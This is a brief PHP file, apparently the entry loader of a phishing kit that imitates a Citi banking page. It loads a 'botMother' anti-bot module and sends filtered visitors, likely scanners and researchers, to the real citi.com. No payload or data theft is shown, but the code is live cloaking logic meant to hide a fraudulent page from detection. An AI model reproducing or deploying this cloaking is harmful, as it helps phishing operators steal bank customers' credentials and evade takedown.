<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/lib/frm.php';

require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://citi.com");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
$bm->run();
}


 

?>